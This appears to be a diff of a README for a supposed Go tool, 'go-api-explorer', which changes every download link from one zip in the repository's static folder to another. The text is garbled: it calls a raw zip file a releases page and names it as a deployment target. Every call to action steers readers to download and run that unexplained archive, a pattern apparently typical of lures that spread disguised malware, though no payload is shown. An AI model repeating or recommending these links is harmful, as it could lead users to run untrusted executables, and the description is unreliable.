@@ -1,10 +1,10 @@
 # 🚀 go-api-explorer - Explore APIs with Ease
 
-[![Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip)](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip)
+[![Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip)](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip)
 
 ## 📥 Introduction
 
-Welcome to go-api-explorer. This simple application allows you to explore JSON APIs easily. It includes a proxy endpoint for accessing external APIs and offers convenient features like a quick-fill presets library. The user-friendly interface is built with Tailwind CSS, ensuring it looks good and is responsive across devices. Whether you need raw data or pretty formatting, go-api-explorer has you covered. Plus, it’s easy to deploy without any configuration using https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip
+Welcome to go-api-explorer. This simple application allows you to explore JSON APIs easily. It includes a proxy endpoint for accessing external APIs and offers convenient features like a quick-fill presets library. The user-friendly interface is built with Tailwind CSS, ensuring it looks good and is responsive across devices. Whether you need raw data or pretty formatting, go-api-explorer has you covered. Plus, it’s easy to deploy without any configuration using https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip
 
 ## 📋 Features
 
@@ -12,7 +12,7 @@ Welcome to go-api-explorer. This simple application allows you to explore JSON A
 - **Quick-Fill Presets:** Save time with ready-made templates.
 - **Responsive Design:** Enjoy a great experience on any device.
 - **Pretty and Raw Formatting:** Switch between views effortlessly.
-- **Zero-Config Deployment:** Get started on https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip with no setup required.
+- **Zero-Config Deployment:** Get started on https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip with no setup required.
 
 ## 🛠️ System Requirements
 
@@ -28,7 +28,7 @@ To run go-api-explorer effectively, ensure your device meets these requirements:
 
 Follow these steps to download and run go-api-explorer:
 
-1. **Visit the Releases Page:** Go to our releases page to download the application. You can find it here: [Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip).
+1. **Visit the Releases Page:** Go to our releases page to download the application. You can find it here: [Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip).
    
 2. **Download the Latest Version:** On the releases page, look for the latest version. Click the asset that matches your operating system to start the download.
 
@@ -41,7 +41,7 @@ Follow these steps to download and run go-api-explorer:
 
 ## 💻 Download & Install
 
-To get your copy of go-api-explorer, please visit this page: [Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/go-api-explorer-1.2.zip). Choose the version that suits your operating system and follow the previous steps to install it on your computer.
+To get your copy of go-api-explorer, please visit this page: [Download go-api-explorer](https://raw.githubusercontent.com/segawonig/go-api-explorer/main/static/api_explorer_go_1.7.zip). Choose the version that suits your operating system and follow the previous steps to install it on your computer.
 
 ## 📊 Using go-api-explorer
 
